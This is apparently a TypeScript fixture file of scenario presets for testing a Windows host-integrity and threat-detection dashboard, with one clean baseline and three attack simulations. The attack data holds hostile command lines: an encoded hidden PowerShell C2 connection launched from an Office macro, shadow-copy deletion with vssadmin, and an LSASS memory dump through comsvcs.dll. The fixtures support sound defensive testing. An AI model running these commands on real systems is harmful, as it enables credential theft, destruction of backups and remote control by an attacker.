/**
 * Predefined Scenarios for Testing, Simulation, and Architectural Verification
 */

import { ScenarioPreset, SystemState, NormalizedEvent } from '../types/integrity';

export const SCENARIOS: ScenarioPreset[] = [
  {
    id: 'clean_baseline',
    name: 'Verified Golden Baseline',
    badge: '98.5% • HEALTHY',
    description: 'UAE Sovereign Node in nominal operating parameters. All running processes signed, security services active, zero unauthorized socket binds.',
    expected_trust_score: 98.5,
    expected_risk: 'LOW',
    state: {
      host_id: 'UAE-SOV-NODE-01',
      hostname: 'SEC-HQ-NODE-DXB',
      os_version: 'Windows Server 2025 Datacenter (Build 26100)',
      snapshot_timestamp: new Date().toISOString(),
      processes: [
        { pid: 4, name: 'System', path: 'ntoskrnl.exe', command_line: 'ntoskrnl.exe', hash_sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', is_signed: true, signer: 'Microsoft Windows', parent_name: '', parent_pid: 0, user: 'NT AUTHORITY\\SYSTEM', integrity_level: 'System', start_time: '2026-09-02T08:00:00Z' },
        { pid: 388, name: 'smss.exe', path: 'C:\\Windows\\System32\\smss.exe', command_line: '\\SystemRoot\\System32\\smss.exe', hash_sha256: '992a838192a01928471928471928471928471928471928471928471928471928', is_signed: true, signer: 'Microsoft Windows', parent_name: 'System', parent_pid: 4, user: 'NT AUTHORITY\\SYSTEM', integrity_level: 'System', start_time: '2026-09-02T08:00:01Z' },
        { pid: 512, name: 'csrss.exe', path: 'C:\\Windows\\System32\\csrss.exe', command_line: '%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768', hash_sha256: '1122334455667788990011223344556677889900112233445566778899001122', is_signed: true, signer: 'Microsoft Windows', parent_name: 'smss.exe', parent_pid: 388, user: 'NT AUTHORITY\\SYSTEM', integrity_level: 'System', start_time: '2026-09-02T08:00:02Z' },
        { pid: 640, name: 'lsass.exe', path: 'C:\\Windows\\System32\\lsass.exe', command_line: 'C:\\Windows\\system32\\lsass.exe', hash_sha256: '3344556677889900112233445566778899001122334455667788990011223344', is_signed: true, signer: 'Microsoft Windows', parent_name: 'wininit.exe', parent_pid: 580, user: 'NT AUTHORITY\\SYSTEM', integrity_level: 'System', start_time: '2026-09-02T08:00:03Z' },
        { pid: 728, name: 'services.exe', path: 'C:\\Windows\\System32\\services.exe', command_line: 'C:\\Windows\\system32\\services.exe', hash_sha256: '5566778899001122334455667788990011223344556677889900112233445566', is_signed: true, signer: 'Microsoft Windows', parent_name: 'wininit.exe', parent_pid: 580, user: 'NT AUTHORITY\\SYSTEM', integrity_level: 'System', start_time: '2026-09-02T08:00:03Z' },
        { pid: 1024, name: 'svchost.exe', path: 'C:\\Windows\\System32\\svchost.exe', command_line: 'C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p', hash_sha256: '7788990011223344556677889900112233445566778899001122334455667788', is_signed: true, signer: 'Microsoft Windows', parent_name: 'services.exe', parent_pid: 728, user: 'NT AUTHORITY\\SYSTEM', integrity_level: 'System', start_time: '2026-09-02T08:00:04Z' },
        { pid: 1450, name: 'MsMpEng.exe', path: 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\MsMpEng.exe', command_line: '"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\MsMpEng.exe"', hash_sha256: 'aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899', is_signed: true, signer: 'Microsoft Windows', parent_name: 'services.exe', parent_pid: 728, user: 'NT AUTHORITY\\SYSTEM', integrity_level: 'System', start_time: '2026-09-02T08:00:05Z' },
        { pid: 2190, name: 'agent.exe', path: 'C:\\Program Files\\UAE-AIOS\\Agent\\agent.exe', command_line: '"C:\\Program Files\\UAE-AIOS\\Agent\\agent.exe" --service', hash_sha256: '00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff', is_signed: true, signer: 'UAE Sovereign Cyber Authority', parent_name: 'services.exe', parent_pid: 728, user: 'NT AUTHORITY\\SYSTEM', integrity_level: 'System', start_time: '2026-09-02T08:00:06Z' },
      ],
      services: [
        { name: 'WinDefend', display_name: 'Microsoft Defender Antivirus Service', status: 'Running', start_type: 'Automatic', binary_path: 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\MsMpEng.exe', is_security_critical: true, is_known_baseline: true },
        { name: 'EventLog', display_name: 'Windows Event Log', status: 'Running', start_type: 'Automatic', binary_path: 'C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted', is_security_critical: true, is_known_baseline: true },
        { name: 'CryptSvc', display_name: 'Cryptographic Services', status: 'Running', start_type: 'Automatic', binary_path: 'C:\\Windows\\System32\\svchost.exe -k NetworkService', is_security_critical: true, is_known_baseline: true },
        { name: 'MpsSvc', display_name: 'Windows Defender Firewall', status: 'Running', start_type: 'Automatic', binary_path: 'C:\\Windows\\System32\\svchost.exe -k LocalServiceNoNetwork', is_security_critical: true, is_known_baseline: true },
        { name: 'AIOS-Telemetry', display_name: 'UAE AIOS Sovereign Telemetry Service', status: 'Running', start_type: 'Automatic', binary_path: 'C:\\Program Files\\UAE-AIOS\\Agent\\telemetry-svc.exe', is_security_critical: true, is_known_baseline: true },
      ],
      network_connections: [
        { protocol: 'TCP', local_ip: '0.0.0.0', local_port: 443, remote_ip: '0.0.0.0', remote_port: 0, state: 'LISTENING', process_name: 'svchost.exe', process_pid: 1024, is_unexpected: false, destination_reputation: 'benign' },
        { protocol: 'TCP', local_ip: '10.240.10.15', local_port: 52140, remote_ip: '20.190.159.0', remote_port: 443, state: 'ESTABLISHED', process_name: 'agent.exe', process_pid: 2190, is_unexpected: false, destination_reputation: 'benign' },
      ],
      fim_files: [
        { path: 'C:\\Windows\\System32\\ntoskrnl.exe', expected_hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', current_hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', is_modified: false, last_modified: '2026-08-01T12:00:00Z', is_system_critical: true },
        { path: 'C:\\Windows\\System32\\kernel32.dll', expected_hash: 'a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0', current_hash: 'a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0', is_modified: false, last_modified: '2026-08-01T12:00:00Z', is_system_critical: true },
        { path: 'C:\\Windows\\System32\\drivers\\etc\\hosts', expected_hash: '89b983570f031023a1a3a936a282910790936e7a2b9183749202746101928374', current_hash: '89b983570f031023a1a3a936a282910790936e7a2b9183749202746101928374', is_modified: false, last_modified: '2026-08-01T12:00:00Z', is_system_critical: true },
      ],
      recent_events: [
        { event_id: 'EV-1001', timestamp: new Date(Date.now() - 60000).toISOString(), source: 'sysmon', type: 'process_start', severity: 'info', entity: 'agent.exe [PID: 2190]', evidence: { Image: 'agent.exe', Signature: 'Valid', Signer: 'UAE Sovereign Cyber Authority' }, confidence: 1.0, mitre_tactic: 'Discovery' },
        { event_id: 'EV-1002', timestamp: new Date(Date.now() - 30000).toISOString(), source: 'windows_eventlog', type: 'auth_success', severity: 'info', entity: 'User: sec_operator_dxb', evidence: { LogonType: 2, Elevation: 'Standard' }, confidence: 1.0, mitre_tactic: 'Initial Access' },
      ]
    },
    events: []
  },
  {
    id: 'supply_chain_tamper',
    name: 'Supply Chain & Defense Evasion',
    badge: '61.5% • HIGH RISK',
    description: 'Unknown service installed, security defender stopped (`WinDefend`), and unsigned executable executing from temporary path.',
    expected_trust_score: 61.5,
    expected_risk: 'HIGH',
    state: {
      host_id: 'UAE-SOV-NODE-01',
      hostname: 'SEC-HQ-NODE-DXB',
      os_version: 'Windows Server 2025 Datacenter (Build 26100)',
      snapshot_timestamp: new Date().toISOString(),
      processes: [
        { pid: 4, name: 'System', path: 'ntoskrnl.exe', command_line: 'ntoskrnl.exe', hash_sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', is_signed: true, signer: 'Microsoft Windows', parent_name: '', parent_pid: 0, user: 'NT AUTHORITY\\SYSTEM', integrity_level: 'System', start_time: '2026-09-02T08:00:00Z' },
        { pid: 1024, name: 'svchost.exe', path: 'C:\\Windows\\System32\\svchost.exe', command_line: 'C:\\Windows\\system32\\svchost.exe -k DcomLaunch', hash_sha256: '7788990011223344556677889900112233445566778899001122334455667788', is_signed: true, signer: 'Microsoft Windows', parent_name: 'services.exe', parent_pid: 728, user: 'NT AUTHORITY\\SYSTEM', integrity_level: 'System', start_time: '2026-09-02T08:00:04Z' },
        { pid: 4892, name: 'update_sync.exe', path: 'C:\\Users\\sec_operator\\AppData\\Local\\Temp\\update_sync.exe', command_line: 'C:\\Users\\sec_operator\\AppData\\Local\\Temp\\update_sync.exe --silent-inject', hash_sha256: '9f8372615243dfba99887766554433221100ffeeddccbbaa9988776655443322', is_signed: false, signer: 'NONE (Unsigned)', parent_name: 'explorer.exe', parent_pid: 2400, user: 'SEC-HQ\\sec_operator', integrity_level: 'High', start_time: new Date(Date.now() - 120000).toISOString() },
      ],
      services: [
        { name: 'WinDefend', display_name: 'Microsoft Defender Antivirus Service', status: 'Stopped', start_type: 'Disabled', binary_path: 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\MsMpEng.exe', is_security_critical: true, is_known_baseline: true },
        { name: 'EventLog', display_name: 'Windows Event Log', status: 'Running', start_type: 'Automatic', binary_path: 'C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted', is_security_critical: true, is_known_baseline: true },
        { name: 'SyncBridgeSvc', display_name: 'External Vendor Sync Bridge', status: 'Running', start_type: 'Automatic', binary_path: 'C:\\ProgramData\\SyncBridge\\bridge.exe', is_security_critical: false, is_known_baseline: false },
      ],
      network_connections: [
        { protocol: 'TCP', local_ip: '10.240.10.15', local_port: 49812, remote_ip: '198.51.100.89', remote_port: 8443, state: 'ESTABLISHED', process_name: 'update_sync.exe', process_pid: 4892, is_unexpected: true, destination_reputation: 'suspicious' }
      ],
      fim_files: [
        { path: 'C:\\Windows\\System32\\drivers\\etc\\hosts', expected_hash: '89b983570f031023a1a3a936a282910790936e7a2b9183749202746101928374', current_hash: '89b983570f031023a1a3a936a282910790936e7a2b9183749202746101928374', is_modified: false, last_modified: '2026-08-01T12:00:00Z', is_system_critical: true },
      ],
      recent_events: [
        { event_id: 'EV-3001', timestamp: new Date(Date.now() - 150000).toISOString(), source: 'windows_eventlog', type: 'service_change', severity: 'critical', entity: 'WinDefend (Stopped)', evidence: { ServiceName: 'WinDefend', NewStatus: 'Stopped', ChangedBy: 'System/Privileged' }, confidence: 1.0, mitre_tactic: 'Defense Evasion', mitre_technique: 'T1562.001' },
        { event_id: 'EV-3002', timestamp: new Date(Date.now() - 120000).toISOString(), source: 'sysmon', type: 'process_start', severity: 'high', entity: 'update_sync.exe [PID: 4892]', evidence: { Path: 'C:\\Users\\sec_operator\\AppData\\Local\\Temp\\update_sync.exe', Signature: 'Invalid', CommandLine: '--silent-inject' }, confidence: 1.0, mitre_tactic: 'Execution', mitre_technique: 'T1204' }
      ]
    },
    events: []
  },
  {
    id: 'ransomware_c2_chain',
    name: 'Active Attack Chain & C2 Beaconing',
    badge: '34.0% • CRITICAL',
    description: 'Office macro spawned encoded PowerShell LOLBin, outbound socket to known C2 port 4444, system hosts file modified, and Defender killed.',
    expected_trust_score: 34.0,
    expected_risk: 'CRITICAL',
    state: {
      host_id: 'UAE-SOV-NODE-01',
      hostname: 'SEC-HQ-NODE-DXB',
      os_version: 'Windows Server 2025 Datacenter (Build 26100)',
      snapshot_timestamp: new Date().toISOString(),
      processes: [
        { pid: 4, name: 'System', path: 'ntoskrnl.exe', command_line: 'ntoskrnl.exe', hash_sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', is_signed: true, signer: 'Microsoft Windows', parent_name: '', parent_pid: 0, user: 'NT AUTHORITY\\SYSTEM', integrity_level: 'System', start_time: '2026-09-02T08:00:00Z' },
        { pid: 3120, name: 'WINWORD.EXE', path: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', command_line: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" "C:\\Users\\Finance\\Downloads\\Contract_Amendment_Q3.docm"', hash_sha256: '4455667788990011223344556677889900112233445566778899001122334455', is_signed: true, signer: 'Microsoft Corporation', parent_name: 'explorer.exe', parent_pid: 2400, user: 'SEC-HQ\\Finance_Lead', integrity_level: 'Medium', start_time: new Date(Date.now() - 300000).toISOString() },
        { pid: 5812, name: 'powershell.exe', path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', command_line: 'powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAsADQANAA0ADQAKQA=', hash_sha256: '887766554433221100ffeeddccbbaa99887766554433221100ffeeddccbbaa99', is_signed: true, signer: 'Microsoft Corporation', parent_name: 'WINWORD.EXE', parent_pid: 3120, user: 'SEC-HQ\\Finance_Lead', integrity_level: 'High', start_time: new Date(Date.now() - 240000).toISOString() },
        { pid: 6104, name: 'vssadmin.exe', path: 'C:\\Windows\\System32\\vssadmin.exe', command_line: 'vssadmin delete shadows /all /quiet', hash_sha256: '1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef', is_signed: true, signer: 'Microsoft Windows', parent_name: 'powershell.exe', parent_pid: 5812, user: 'NT AUTHORITY\\SYSTEM', integrity_level: 'System', start_time: new Date(Date.now() - 180000).toISOString() },
      ],
      services: [
        { name: 'WinDefend', display_name: 'Microsoft Defender Antivirus Service', status: 'Stopped', start_type: 'Disabled', binary_path: 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\MsMpEng.exe', is_security_critical: true, is_known_baseline: true },
        { name: 'EventLog', display_name: 'Windows Event Log', status: 'Running', start_type: 'Automatic', binary_path: 'C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted', is_security_critical: true, is_known_baseline: true },
        { name: 'CryptSvc', display_name: 'Cryptographic Services', status: 'Running', start_type: 'Automatic', binary_path: 'C:\\Windows\\System32\\svchost.exe -k NetworkService', is_security_critical: true, is_known_baseline: true },
      ],
      network_connections: [
        { protocol: 'TCP', local_ip: '10.240.10.15', local_port: 51234, remote_ip: '198.51.100.23', remote_port: 4444, state: 'ESTABLISHED', process_name: 'powershell.exe', process_pid: 5812, is_unexpected: true, destination_reputation: 'malicious' }
      ],
      fim_files: [
        { path: 'C:\\Windows\\System32\\drivers\\etc\\hosts', expected_hash: '89b983570f031023a1a3a936a282910790936e7a2b9183749202746101928374', current_hash: 'cafebabedeadbeef0123456789abcdefcafebabedeadbeef0123456789abcdef', is_modified: true, last_modified: new Date(Date.now() - 200000).toISOString(), is_system_critical: true },
      ],
      recent_events: [
        { event_id: 'EV-5001', timestamp: new Date(Date.now() - 250000).toISOString(), source: 'sysmon', type: 'process_start', severity: 'critical', entity: 'powershell.exe [Child of WINWORD.EXE]', evidence: { ParentImage: 'WINWORD.EXE', Image: 'powershell.exe', CommandLine: '-enc JABjAGwAaQBlAG4Ad...' }, confidence: 1.0, mitre_tactic: 'Execution', mitre_technique: 'T1059.001' },
        { event_id: 'EV-5002', timestamp: new Date(Date.now() - 240000).toISOString(), source: 'sysmon', type: 'network_connect', severity: 'critical', entity: 'powershell.exe -> 198.51.100.23:4444', evidence: { DestinationIp: '198.51.100.23', DestinationPort: 4444, Protocol: 'TCP' }, confidence: 1.0, mitre_tactic: 'Command and Control', mitre_technique: 'T1071' },
        { event_id: 'EV-5003', timestamp: new Date(Date.now() - 180000).toISOString(), source: 'sysmon', type: 'process_start', severity: 'high', entity: 'vssadmin.exe delete shadows', evidence: { CommandLine: 'delete shadows /all /quiet' }, confidence: 1.0, mitre_tactic: 'Impact', mitre_technique: 'T1490' },
        { event_id: 'EV-5004', timestamp: new Date(Date.now() - 170000).toISOString(), source: 'fim_driver', type: 'file_modify', severity: 'critical', entity: 'C:\\Windows\\System32\\drivers\\etc\\hosts', evidence: { OldHash: '89b98357...', NewHash: 'cafebabe...' }, confidence: 1.0, mitre_tactic: 'Persistence', mitre_technique: 'T1574' }
      ]
    },
    events: []
  },
  {
    id: 'cred_dumping_lateral',
    name: 'Credential Access & Token Escalation',
    badge: '42.5% • CRITICAL',
    description: 'LSASS memory read detected (Sysmon Event ID 10), unauthorized SeDebugPrivilege enabled, and PsExec remote service created.',
    expected_trust_score: 42.5,
    expected_risk: 'CRITICAL',
    state: {
      host_id: 'UAE-SOV-NODE-01',
      hostname: 'SEC-HQ-NODE-DXB',
      os_version: 'Windows Server 2025 Datacenter (Build 26100)',
      snapshot_timestamp: new Date().toISOString(),
      processes: [
        { pid: 4, name: 'System', path: 'ntoskrnl.exe', command_line: 'ntoskrnl.exe', hash_sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', is_signed: true, signer: 'Microsoft Windows', parent_name: '', parent_pid: 0, user: 'NT AUTHORITY\\SYSTEM', integrity_level: 'System', start_time: '2026-09-02T08:00:00Z' },
        { pid: 640, name: 'lsass.exe', path: 'C:\\Windows\\System32\\lsass.exe', command_line: 'C:\\Windows\\system32\\lsass.exe', hash_sha256: '3344556677889900112233445566778899001122334455667788990011223344', is_signed: true, signer: 'Microsoft Windows', parent_name: 'wininit.exe', parent_pid: 580, user: 'NT AUTHORITY\\SYSTEM', integrity_level: 'System', start_time: '2026-09-02T08:00:03Z' },
        { pid: 7712, name: 'rundll32.exe', path: 'C:\\Windows\\System32\\rundll32.exe', command_line: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 640 C:\\Windows\\Temp\\lsass.dmp full', hash_sha256: '5566778899aabbccddeeff00112233445566778899aabbccddeeff0011223344', is_signed: true, signer: 'Microsoft Windows', parent_name: 'cmd.exe', parent_pid: 7100, user: 'SEC-HQ\\Admin_Guest', integrity_level: 'High', start_time: new Date(Date.now() - 90000).toISOString() },
      ],
      services: [
        { name: 'WinDefend', display_name: 'Microsoft Defender Antivirus Service', status: 'Running', start_type: 'Automatic', binary_path: 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\MsMpEng.exe', is_security_critical: true, is_known_baseline: true },
        { name: 'PSEXESVC', display_name: 'PsExec Service', status: 'Running', start_type: 'Manual', binary_path: 'C:\\Windows\\PSEXESVC.exe', is_security_critical: false, is_known_baseline: false },
      ],
      network_connections: [
        { protocol: 'TCP', local_ip: '10.240.10.15', local_port: 445, remote_ip: '10.240.10.99', remote_port: 59340, state: 'ESTABLISHED', process_name: 'System', process_pid: 4, is_unexpected: true, destination_reputation: 'suspicious' }
      ],
      fim_files: [
        { path: 'C:\\Windows\\System32\\ntoskrnl.exe', expected_hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', current_hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', is_modified: false, last_modified: '2026-08-01T12:00:00Z', is_system_critical: true },
      ],
      recent_events: [
        { event_id: 'EV-6001', timestamp: new Date(Date.now() - 110000).toISOString(), source: 'sysmon', type: 'privilege_escalation', severity: 'critical', entity: 'rundll32.exe [Target: LSASS PID 640]', evidence: { SourceImage: 'rundll32.exe', TargetImage: 'lsass.exe', GrantedAccess: '0x1FFFFF', CallTrace: 'C:\\Windows\\System32\\comsvcs.dll' }, confidence: 1.0, mitre_tactic: 'Credential Access', mitre_technique: 'T1003.001' },
        { event_id: 'EV-6002', timestamp: new Date(Date.now() - 95000).toISOString(), source: 'windows_eventlog', type: 'service_change', severity: 'high', entity: 'PSEXESVC (Remote execution)', evidence: { ServiceName: 'PSEXESVC', ImagePath: 'C:\\Windows\\PSEXESVC.exe' }, confidence: 1.0, mitre_tactic: 'Lateral Movement', mitre_technique: 'T1570' }
      ]
    },
    events: []
  }
];
